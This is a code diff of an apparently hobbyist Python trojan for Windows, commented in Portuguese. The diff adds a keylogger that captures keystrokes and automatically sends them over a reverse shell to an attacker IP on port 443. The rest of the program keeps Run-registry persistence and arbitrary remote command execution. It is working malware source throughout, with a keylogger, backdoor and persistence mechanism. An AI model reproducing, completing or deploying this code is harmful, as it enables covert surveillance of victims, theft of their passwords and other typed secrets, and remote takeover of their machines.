@@ -5,9 +5,11 @@ import shutil
 import winreg
 import sys
 from time import sleep
+from pynput import keyboard
+from datetime import datetime
 # shell reverso
 # IP para se conectar com a máquina vitima (Ip ataque)
-IP = "192.168.1.xx";
+IP = "192.168.2.116";
 # muito utilizada para conexões em sites, e o firewall normalmente deixa passar
 # não é regra para todo mundo
 PORT = 443;
@@ -16,7 +18,73 @@ PORT = 443;
 # Software\Microsoft\Windows\CurrentVersion\Run
 
 PROGRAM = "TrojanPersistence";
-REGISTRY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run";
+REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run";
+MAX_BUFFER = 500;
+
+
+key_log_buffer = [];
+buffer_auto_send_pending = False;
+keylogger_active = False; 
+listener = None;
+
+def format_key(key):
+    try: 
+        return key.char
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: ' ',
+            keyboard.Key.enter: '[ENTER]\n',
+            keyboard.Key.tab: '[TAB]',
+            keyboard.Key.backspace: '[BACKSPACE]',
+            keyboard.Key.shift: '',
+            keyboard.Key.ctrl: '',
+            keyboard.Key.alt: '',
+        }
+        return special_keys.get(key, f'[{key.name.upper()}]')
+    
+def on_press(key):
+    global key_log_buffer, buffer_auto_send_pending
+    
+    formatted = format_key(key);    
+    if formatted:
+        key_log_buffer.append(formatted);
+        
+    if len(key_log_buffer) >= MAX_BUFFER:   
+        buffer_auto_send_pending = True;
+        
+
+def get_key_log_data():
+    global key_log_buffer;
+    
+    if not key_log_buffer:
+        return "[i] Keylog buffer is empty";
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S");
+    data = f"[+ Keylog captured at {timestamp}:\n{''.join(key_log_buffer)}\n";
+    key_log_buffer = [];
+    return data;
+
+def start_keylogger():
+    global listener, keylogger_active;
+    
+    if keylogger_active:
+        return "[i] Keylogger is already running";
+    
+    listener = keyboard.Listener(on_press=on_press);
+    listener.start();
+    keylogger_active = True;
+    return "[+] Keylogger started successfully";
+
+def stop_keylogger():
+    global listener, keylogger_active;
+    
+    if not keylogger_active:
+        return "[i] Keylogger is not running";
+    
+    if listener:
+        listener.stop();
+    
+    keylogger_active = False;
+    return "[+] Keylogger stopped successfully";
 
 def copy_to_system():
     try:
@@ -89,13 +157,25 @@ def connect(ip, port):
     
 
 def listen(c):
+    global buffer_auto_send_pending;
     try:
         while True:
-            data = c.recv(1024).decode().strip();
-            if data == "/exit":
-                return;
-            else:
-                cmd(c, data);
+            if buffer_auto_send_pending:
+                data = get_key_log_data();
+                c.send(f"[AUTO-SEND] {data}\n[AUTO-SEND]\n".encode());
+                buffer_auto_send_pending = False;
+                
+            c.settimeout(0.5);
+            
+            try:
+                data = c.recv(1024).decode().strip();
+                if data == "/exit":
+                    return;
+                else:
+                    cmd(c, data);
+            except socket.timeout:
+                continue;
+                
     except Exception as e:
         print(f'[!] Error receiving data: {e}');    
     
@@ -107,23 +187,44 @@ def cmd(c, data):
             c.send(b"[i] Changed directory to");
             return 
         
-        if data == "/check_persistence":
+        elif data == "/persistence status":
             if check_persistence():
-                c.send(b"[+] Persistence Status:\n[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_PATH}\\{PROGRAM}\n\t[+] Status: Active\n".encode());
+                c.send(b"[+] Persistence Status:\n[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_PATH}\\{PROGRAM}\n\t[+] Status: Active\n\n".encode());
             else:
-                c.send(b"[!] Persistence not found.\n");
+                c.send(b"[!] Persistence not found.\n\n");
                 return
-        if data == "/setup_persistence":
+        elif data == "/persistence setup":
             setup_persistence();
-            c.send(b"[+] Persistence setup completed.\n");
+            c.send(b"[+] Persistence setup completed.\n\n");
             return
+        
+        elif data == "/keylogger start":
+            response = start_keylogger();
+            c.send(response.encode() + b"\n\n");
             
-        p = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr= subprocess.PIPE, stdout= subprocess.PIPE);
-        output = p.stdout.read() + p.stderr.read();
-        if output:
-            c.send(output + b"\n");
+        elif data == "/keylogger stop":
+            response = stop_keylogger();
+            c.send(response.encode() + b"\n\n");
+            return;
+        
+        elif data == "/keylogger dump":
+            response = get_key_log_data();
+            c.send(response.encode() + b"\n\n");
+            return
+        
+        elif data == "/keylogger status":
+            status = "Running" if keylogger_active else "Stopped";
+            buffer_size = len(key_log_buffer);
+            response = f"[+] keylogger status: {status}\n[i] Buffer: {buffer_size} keys";
+            c.send(response.encode() + b"\n\n");
+            return;
         else:
-            c.send(b"[i] Command executed, but no output was returned.\n");    
+            p = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr= subprocess.PIPE, stdout= subprocess.PIPE);
+            output = p.stdout.read() + p.stderr.read();
+            if output:
+                c.send(output + b"\n");
+            else:
+                c.send(b"[i] Command executed, but no output was returned.\n\n");    
     except Exception as e:
         print("Erro ao executar comando: ", e);    
     
